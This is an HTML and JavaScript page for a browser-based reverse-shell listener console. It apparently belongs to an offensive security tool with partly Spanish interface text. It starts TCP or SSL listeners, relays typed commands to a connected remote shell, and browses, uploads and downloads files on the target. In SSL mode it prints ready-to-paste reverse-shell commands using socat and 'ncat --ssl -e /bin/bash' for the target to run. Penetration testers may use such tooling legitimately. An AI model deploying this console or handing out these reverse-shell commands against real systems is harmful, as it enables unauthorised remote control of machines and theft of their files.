<!-- styles in /static/style.css -->


<div id="shells-wrapper">
  <div id="shell-controls">
    <label for="listener-ip">IP:</label>
    <input type="text" id="listener-ip" list="listener-ip-list" placeholder="192.168.1.1" autocomplete="off">
    <datalist id="listener-ip-list"></datalist>

    <label for="listener-port">Port:</label>
    <input type="number" id="listener-port" placeholder="4444" value="4444">

    <label for="listener-mode">Mode:</label>
    <select id="listener-mode">
      <option value="tcp">TCP (nc, bash, socat, python, ps)</option>
      <option value="ssl">SSL/TLS (socat OPENSSL, ncat --ssl)</option>
    </select>

    <button id="start-listener" class="btn" style="width:100%;margin-top:10px;">Start Listener</button>
    <button id="stop-listener" class="btn" style="width:100%;margin-top:4px;">Stop Listener</button>

    <div style="display:flex;gap:6px;margin-top:10px;">
      <button id="upload-btn" class="btn" style="flex:1;">Upload</button>
      <button id="download-btn" class="btn" style="flex:1;">Download</button>
    </div>
  </div>

  <div id="shell-area">
    <div id="shell-tabs">
      <button class="tab active" data-tab="0" onclick="switchTab(0)">shell <span class="close-btn" onclick="closeTab(0)">&times;</span></button>
      <button id="add-tab" class="btn btn-sm" style="display:none;">+</button>
    </div>

    <div id="shell-output"></div>
    <input type="text" id="shell-input" placeholder="Enter command and press Enter">
  </div>
</div>

<div id="download-popup">
  <h3>Explorador remoto</h3>
  <div id="remote-file-list" class="popup-listing"></div>
  <div class="popup-actions">
    <button class="btn" onclick="cancelDownload()">Cancelar</button>
    <button class="btn btn-primary" onclick="performDownloadSelection()">Descargar</button>
  </div>
</div>


<script>
let currentTab = 0;


let shells;
try {
  const stored = localStorage.getItem("shells");
  shells = stored ? JSON.parse(stored) : [{ port: null, output: "" }];
} catch (e) {
  shells = [{ port: null, output: "" }];
}


const commandList = ['upload', 'download', 'sudo', 'clear', 'exit'];
const inputField = document.getElementById('shell-input');

inputField.addEventListener('input', function () {
  const value = inputField.value.toLowerCase();
  const match = commandList.find(cmd => cmd.startsWith(value));
  if (match && match !== value) {
    inputField.value = match;
    inputField.setSelectionRange(value.length, match.length);
  }
});




function persistShells() {
  localStorage.setItem("shells", JSON.stringify(shells));
}





function makePopupDraggable(popup) {
  let offsetX = 0, offsetY = 0;

  const header = popup.querySelector('h3');

  function drag(e) {
    popup.style.left = (e.clientX - offsetX) + 'px';
    popup.style.top = (e.clientY - offsetY) + 'px';
  }

  function stopDrag() {
    document.removeEventListener('mousemove', drag);
    document.removeEventListener('mouseup', stopDrag);
  }

  header.addEventListener('mousedown', function(e) {
    offsetX = e.clientX - popup.offsetLeft;
    offsetY = e.clientY - popup.offsetTop;
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', stopDrag);
  });
}

makePopupDraggable(document.getElementById('download-popup'));

function appendOutput(text, isInfo = false) {
  if (typeof text === 'object') {
    text = text.output || JSON.stringify(text);
  }
  const output = document.getElementById('shell-output');
  const span = document.createElement('span');
  span.textContent = text + "\n";
  span.className = isInfo ? 'message-info' : 'message-output';
  output.appendChild(span);
  output.scrollTop = output.scrollHeight;
  shells[currentTab].output += text + "\n";
  persistShells();
}

function updateTabTitles() {
  // Tab labels show port when a listener is active. Port value is sanitized
  // to prevent DOM XSS from tampered localStorage data.
  document.querySelectorAll('.tab').forEach((tab, idx) => {
    if (!tab.id || tab.id !== 'add-tab') {
      var rawPort = shells[idx] && shells[idx].port ? String(shells[idx].port) : '';
      var safePort = rawPort.replace(/[^0-9]/g, '');
      var shellMode = shells[idx] && shells[idx].mode === 'ssl' ? ' SSL' : '';
      var label = safePort ? 'shell:' + safePort + shellMode : 'shell';
      // Build DOM nodes instead of innerHTML to avoid XSS
      while (tab.firstChild) tab.removeChild(tab.firstChild);
      tab.appendChild(document.createTextNode(label + ' '));
      var closeSpan = document.createElement('span');
      closeSpan.className = 'close-btn';
      closeSpan.textContent = '\u00d7';
      closeSpan.setAttribute('data-idx', idx);
      closeSpan.onclick = function(e) { e.stopPropagation(); closeTab(parseInt(this.getAttribute('data-idx'))); };
      tab.appendChild(closeSpan);
      tab.classList.toggle('active', idx === currentTab);
      tab.setAttribute('onclick', `switchTab(${idx})`);
    }
  });
}

function switchTab(index) {
  currentTab = index;
  const output = document.getElementById('shell-output');
  while (output.firstChild) output.removeChild(output.firstChild);
  // Render stored output without re-appending to shells data
  shells[currentTab].output.split("\n").forEach(function(line) {
    if (!line) return;
    var span = document.createElement('span');
    span.textContent = line + "\n";
    span.className = (line.startsWith('[INFO]') || line.startsWith('[ERROR]')) ? 'message-info' : 'message-output';
    output.appendChild(span);
  });
  output.scrollTop = output.scrollHeight;
  updateTabTitles();
}

function closeTab(index) {
  if (shells[index].port) {
    fetch('/stop_listener');
  }
  shells.splice(index, 1);
  const tabs = document.querySelectorAll('.tab');
  if (tabs[index]) tabs[index].remove();
  if (currentTab === index) {
    currentTab = Math.max(0, currentTab - 1);
  }
  persistShells();
  switchTab(currentTab);
}

function createNewTab() {
  const index = shells.length;
  const tabButton = document.createElement('button');
  tabButton.classList.add('tab');
  tabButton.appendChild(document.createTextNode('shell '));
  var closeSpan = document.createElement('span');
  closeSpan.className = 'close-btn';
  closeSpan.textContent = '\u00d7';
  closeSpan.setAttribute('data-idx', index);
  closeSpan.onclick = function(e) { e.stopPropagation(); closeTab(parseInt(this.getAttribute('data-idx'))); };
  tabButton.appendChild(closeSpan);
  tabButton.setAttribute('onclick', `switchTab(${index})`);
  tabButton.dataset.tab = index;

  document.getElementById('shell-tabs').insertBefore(tabButton, document.getElementById('add-tab'));
  shells.push({ port: null, output: "" });
  persistShells();
  switchTab(index);
}

document.getElementById('add-tab').onclick = createNewTab;

document.getElementById('start-listener').onclick = () => {
  const port = document.getElementById('listener-port').value.replace(/[^0-9]/g, '');
  if (!port) return alert("Enter a port.");

  // Check if port is already used by another tab
  var existingIdx = shells.findIndex(function(s) { return s.port == port; });
  if (existingIdx !== -1) {
    appendOutput(`[ERROR] Port ${port} already in use (tab ${existingIdx + 1})`, true);
    return;
  }

  // If current tab already has a listener, create a new tab
  if (shells[currentTab].port) {
    createNewTab();
  }

  var mode = document.getElementById('listener-mode').value;

  // Set port immediately (fetch blocks until a connection arrives)
  shells[currentTab].port = port;
  shells[currentTab].mode = mode;
  updateTabTitles();
  persistShells();

  var modeLabel = mode === 'ssl' ? 'SSL' : 'TCP';
  appendOutput(`[INFO] Listening on port ${port} (${modeLabel})...`, true);
  if (mode === 'ssl') {
    var lip = document.getElementById('listener-ip').value;
    appendOutput('[INFO] Connect from target (pick one):', true);
    appendOutput('  socat OPENSSL:' + lip + ':' + port + ',verify=0 EXEC:/bin/bash', false);
    appendOutput('  socat OPENSSL:' + lip + ':' + port + ",verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", false);
    appendOutput('  ncat --ssl ' + lip + ' ' + port + ' -e /bin/bash', false);
  }
  fetch(`/start_listener/${port}?mode=${mode}`)
    .then(res => res.json())
    .then(data => {
      if (data.error) {
        appendOutput(`[ERROR] ${data.error}`, true);
        // Revert port on error
        shells[currentTab].port = null;
        updateTabTitles();
        persistShells();
        return;
      }
      appendOutput(`[INFO] Shell received on port ${port}`, true);
    })
    .catch(function() {
      appendOutput(`[ERROR] Failed to start listener on port ${port}`, true);
      shells[currentTab].port = null;
      updateTabTitles();
      persistShells();
    });
};

document.getElementById('stop-listener').onclick = () => {
  fetch(`/stop_listener`).then(res => res.json()).then(data => {
    appendOutput("[INFO] Listener stopped", true);
    shells[currentTab].port = null;
    persistShells();
  });
};



document.getElementById('shell-input').addEventListener('keypress', e => {
  if (e.key === 'Enter') {
    const cmd = e.target.value;
    e.target.value = "";
    appendOutput("> " + cmd);

    fetch('/send_command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: cmd })
    })
    .then(res => res.json())
    .then(data => {
      if (data.type === "file") {
        appendOutput(`[INFO] Archivo ${data.path} descargado.`, true);
        appendOutput(`[INFO] MD5 local: ${data.local_md5}`, true);
        appendOutput(`[INFO] MD5 remoto: ${data.remote_md5}`, true);

        if (data.success) {
          appendOutput("✔️ Integridad verificada: los hashes coinciden.", false);
        } else {
          appendOutput("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.", true);
        }
      }

      else if (data.type === "output") {
        appendOutput(data.output);
      }

      else {
        appendOutput("[ERROR] Tipo de respuesta desconocido.", true);
      }
    })
    .catch(err => appendOutput('[ERROR] Command failed', true));
  }
});



(async () => {

  // Restore persisted shells on reload
  const tabs = document.getElementById('shell-tabs');
  for (let i = 1; i < shells.length; i++) {
    const tabButton = document.createElement('button');
    tabButton.classList.add('tab');
    tabButton.appendChild(document.createTextNode('shell '));
    var cs = document.createElement('span');
    cs.className = 'close-btn';
    cs.textContent = '\u00d7';
    cs.setAttribute('data-idx', i);
    cs.onclick = function(e) { e.stopPropagation(); closeTab(parseInt(this.getAttribute('data-idx'))); };
    tabButton.appendChild(cs);
    tabButton.setAttribute('onclick', `switchTab(${i})`);
    tabButton.dataset.tab = i;
    tabs.insertBefore(tabButton, document.getElementById('add-tab'));
  }
  switchTab(currentTab);
})();


async function loadShellIps() {
  const res = await fetch('/ips');
  if (!res.ok) return;

  try {
    const ips = await res.json();
    const list = document.getElementById('listener-ip-list');
    const input = document.getElementById('listener-ip');
    const portInput = document.getElementById('listener-port');

    for (const ip of ips) {
      const opt = document.createElement('option');
      opt.value = ip;
      list.appendChild(opt);
    }

    // Restore saved values or use first IP
    const savedIp = localStorage.getItem('selected-ip');
    input.value = (savedIp && ips.includes(savedIp)) ? savedIp : (ips[0] || '');

    const savedPort = localStorage.getItem('selected-port');
    if (savedPort) portInput.value = savedPort;

    input.addEventListener('change', () => localStorage.setItem('selected-ip', input.value));
    portInput.addEventListener('input', () => localStorage.setItem('selected-port', portInput.value));

  } catch (e) {
    console.error("Failed to load IPs:", e);
  }
}



document.getElementById('upload-btn').addEventListener('click', () => {
  const input = document.createElement('input');
  input.type = 'file';
  input.style.display = 'none';
  document.body.appendChild(input);

  input.addEventListener('change', async () => {
    if (!input.files.length) return;
    const file = input.files[0];
    const formData = new FormData();
    formData.append('file', file);

    const res = await fetch('/send_command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: `upload ${file.name}` })
    });

    const { output } = await res.json();
    appendOutput(output, true);
    input.remove();
  });

  input.click();
});

document.getElementById('download-btn').addEventListener('click', async () => {
  const res = await fetch('/send_command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: 'ls -p' })
  });
  const data = await res.json();
  const entries = data.output.trim().split('\n').filter(Boolean);
  const list = document.getElementById('remote-file-list');
  list.innerHTML = '';

  const addEntry = (name) => {
    const div = document.createElement('div');
    div.textContent = name;
    div.onclick = () => {
      if (name === '..') {
        fetch('/send_command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: 'cd .. && ls -p' })
        }).then(r => r.json()).then(updateDownloadList);
      } else if (name.endsWith('/')) {
        fetch('/send_command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: `cd ${name.replace('/', '')} && ls -p` })
        }).then(r => r.json()).then(updateDownloadList);
      } else {
        list.querySelectorAll('div').forEach(el => el.style.background = '');
        div.style.background = '#333';
        list.dataset.selected = name;
      }
    };
    list.appendChild(div);
  }

  const updateDownloadList = (result) => {
    //const files = result.output.trim().split('\n');
    const files = result.output.trim().split('\n').filter(line => !line.includes('cd') && !line.includes('ls'));

    list.innerHTML = '';
    ['.', '..', ''].concat(files).forEach(f => f && addEntry(f));
  }

  updateDownloadList(data);
  document.getElementById('download-popup').style.display = 'block';
});

function cancelDownload() {
  document.getElementById('download-popup').style.display = 'none';
}


function performDownloadSelection() {
  const file = document.getElementById('remote-file-list').dataset.selected;
  if (!file) return;

  if (file === '.' || file === '..' || file.endsWith('/')) {
    appendOutput("[INFO] Selecciona un archivo válido.", true);
    return;
  }

  fetch('/send_command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: `download ${file}` })
  })
  .then(res => res.json())
  .then(data => {
    if (data.type === "file") {
      appendOutput(`[INFO] Archivo ${data.path} descargado.`, true);
      appendOutput(`[INFO] MD5 local: ${data.local_md5}`, true);
      appendOutput(`[INFO] MD5 remoto: ${data.remote_md5}`, true);

      if (data.success) {
        appendOutput("✔️ Integridad verificada: los hashes coinciden.", false);
      } else {
        appendOutput("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.", true);
      }

    } else if (data.type === "output") {
      appendOutput(data.output);
    } else {
      appendOutput("[ERROR] Tipo de respuesta desconocido.", true);
    }
  })
  .catch(() => {
    appendOutput("[ERROR] No se pudo completar la descarga.", true);
  })
  .finally(() => {
    cancelDownload();
  });
}


async function initShells() {
  // IPs are already loaded by loadShellIps() — nothing extra needed here
}





</script>
